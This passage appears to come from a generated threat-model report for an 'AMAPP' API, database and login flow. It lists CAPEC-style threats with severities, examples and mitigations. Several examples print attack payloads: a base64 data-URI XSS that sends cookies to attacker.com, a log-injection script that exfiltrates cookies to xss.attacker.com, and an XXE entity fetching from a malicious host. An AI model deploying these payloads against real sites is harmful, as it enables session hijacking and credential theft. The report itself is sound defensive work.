  <summary>   CR05   --   Encryption Brute Forcing</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Low</p>
  <h6>Example Instances</h6>
  <p>In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.</p>
  <h6>Mitigations</h6>
  <p>Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore&#x27;s law needs to be taken into account that suggests that computing resources double every eighteen months.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC08   --   Manipulate Registry Information</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application&#x27;s ability to store it).</p>
  <h6>Mitigations</h6>
  <p>Ensure proper permissions are set for Registry hives to prevent users from modifying keys.Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/203.html, http://cwe.mitre.org/data/definitions/15.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   SC05   --   Removing Important Client Functionality</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Attacker reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.Attacker uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they&#x27;re not authorized to use, the Attacker directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).Attacker reverse-engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.</p>
  <h6>Mitigations</h6>
  <p>Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.Design: Ship client-side application with integrity checks (code signing) when possible.Design: Use obfuscation and other techniques to prevent reverse engineering the client code.</p>
  <h6>References</h6>
  <p>http://cwe.mitre.org/data/definitions/602.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP17   --   XSS Using MIME Type Mismatch</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file&#x27;s real type and invokes the appropriate interpreter, scripted content could be invoked.In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.</p>
  <h6>Mitigations</h6>
  <p>Design: Browsers must invoke script filters to detect that the specified MIME type of the file matches the actual type of its content before deciding which script interpreter to use.</p>
  <h6>References</h6>
  <p>http://cwe.mitre.org/data/definitions/79.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/646.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AA03   --   Exploitation of Trusted Credentials</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user&#x27;s session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs. A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The attacker can then use these variables and access the application.</p>
  <h6>Mitigations</h6>
  <p>Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.Design: Use strong session identifiers that are protected in transit and at rest.Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.Implementation: Verify of authenticity of all session IDs at runtime.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/21.html, http://cwe.mitre.org/data/definitions/290.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/664.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC09   --   Functionality Misuse</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker clicks on the &#x27;forgot password&#x27; and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog&#x27;s name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.</p>
  <h6>Mitigations</h6>
  <p>Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.When implementing security features, consider how they can be misused and compromised.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/212.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP18   --   Fuzzing and observing application log data/errors for application mapping</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Low</p>
  <h6>Example Instances</h6>
  <p>The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.</p>
  <h6>Mitigations</h6>
  <p>Design: Construct a &#x27;code book&#x27; for error messages. When using a code book, application error messages aren&#x27;t generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value &#x27;coding&#x27; for the error. Such a technique will require helpdesk and hosting personnel to use a &#x27;code book&#x27; or similar mapping to decode application errors/logs in order to respond to them normally.Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above &#x27;code book&#x27; suggestion.Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie&#x27;s software information filed.Implementation: Obfuscate database type in Database API&#x27;s error message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/215.html, http://cwe.mitre.org/data/definitions/209.html, http://cwe.mitre.org/data/definitions/532.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AA04   --   Exploiting Trust in Client</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server&#x27;s policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.</p>
  <h6>Mitigations</h6>
  <p>Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.Design: Do not rely on client validation or encoding for security purposes.Design: Utilize digital signatures to increase authentication assurance.Design: Utilize two factor authentication to increase authentication assurance.Implementation: Perform input validation for all remote content.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/22.html, http://cwe.mitre.org/data/definitions/287.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP19   --   XML External Entities Blowup</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>In this example, the XML parser parses the attacker&#x27;s XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. &lt;?xml version=1.0?&gt;&lt; !DOCTYPE bomb [&lt;!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe&gt;]&gt;&lt;bomb&gt;&amp;detonate;&lt;/bomb&gt;</p>
  <h6>Mitigations</h6>
  <p>This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC11   --   Session Credential Falsification through Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary uses client side scripting(JavaScript) to set session ID in the victim&#x27;s browser using document.cookie. This fixates a falsified session credential into victim&#x27;s browser with the help of a crafted URL link. Once the victim clicks on the link, the attacker is able to bypass authentication or piggyback off some other authenticated victim&#x27;s session.</p>
  <h6>Mitigations</h6>
  <p>Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult. Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/226.html, http://cwe.mitre.org/data/definitions/565.html, http://cwe.mitre.org/data/definitions/472.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP21   --   DTD Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary injects XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.</p>
  <h6>Mitigations</h6>
  <p>Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.Implementation: Disallow the inclusion of DTDs as part of incoming messages.Implementation: Use XML parsing tools that protect against DTD attacks.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/228.html, http://cwe.mitre.org/data/definitions/829.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP22   --   XML Attribute Blowup</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). &lt;?xml version=1.0?&gt;&lt;fooaaa=ZZZ=...999=/&gt; A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.</p>
  <h6>Mitigations</h6>
  <p>This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP28   --   XSS Targeting URI Placeholders</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: &lt;html&gt;&lt;body&gt;&lt;script&gt;var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): &lt;a href=INJECTION_POINT&gt;My Link&lt;/a&gt; Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.</p>
  <h6>Mitigations</h6>
  <p>Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP29   --   XSS Using Doubled Characters</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>By doubling the &lt; before a script command, (&lt;&lt;script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.</p>
  <h6>Mitigations</h6>
  <p>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/245.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP34   --   SOAP Array Overflow</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Refer to this example - http://projects.webappsec.org/w/page/13246962/SOAP%20Array%20Abuse</p>
  <h6>Mitigations</h6>
  <p>If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/256.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP36   --   HTTP Response Smuggling</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>The attacker targets the cache service used by the organization to reduce load on the internet bandwidth. This server can be a cache server on the LAN or other application server caching the static WebPages. The attacker sends three different HTTP request as shown - Request 1: POST request for http://www.netbanking.com, Request 2: GET request for http:www.netbanking.com/FD.html, Request 3: GET request for http://www.netbanking.com/FD-Rates.html. Due to malformed request cache server assumes request 1 and 3 as valid request and forwards the entire request to the webserver. Webserver which strictly follow then HTTP parsing rule responds with the http://www.netbanking.com/FD.html  HTML page. This is happened because webserver consider request 1 and 2 as valid one. Cache server stores this response against the request 3. When normal users request for page http://www.netbanking.com/FD-Rates.html, cache server responds with the page http://www.netbanking.com/FD.html.Hence attacker will succeeds in cache poisoning.</p>
  <h6>Mitigations</h6>
  <p>Design: Employ strict adherence to interpretations of HTTP messages wherever possible.Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/273.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP37   --   HTTP Request Smuggling</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088</p>
  <h6>Mitigations</h6>
  <p>HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/33.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC16   --   Session Credential Falsification through Prediction</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID&#x27;s using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID&#x27;s and bypass authentication when these session ID&#x27;s are used for authentication. See also: CVE-2001-1534</p>
  <h6>Mitigations</h6>
  <p>Use a strong source of randomness to generate a session ID.Use adequate length session IDs. Do not use information available to the user in order to generate session ID (e.g., time).Ideas for creating random numbers are offered by Eastlake [RFC1750]. Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/59.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC17   --   Session Hijacking - ServerSide</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim’s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.</p>
  <h6>Mitigations</h6>
  <p>Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/593.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC01   --   Privilege Abuse</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DO02   --   Excessive Allocation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</p>
  <h6>Mitigations</h6>
  <p>Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR05   --   Encryption Brute Forcing</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>Low</p>
  <h6>Example Instances</h6>
  <p>In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.</p>
  <h6>Mitigations</h6>
  <p>Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore&#x27;s law needs to be taken into account that suggests that computing resources double every eighteen months.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE04   --   Audit Log Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator&#x27;s cookie and will be able to gain access as that user. For example, a log file entry could contain &lt;script&gt;new Image().src=&#x27;http://xss.attacker.com/log_cookie?cookie=&#x27;+encodeURI(document.cookie);&lt;/script&gt; The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</p>
  <h6>Mitigations</h6>
  <p>Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Submit login credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Submit login credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Submit login credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Submit login credentials </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Submit login credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Validate credentials </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
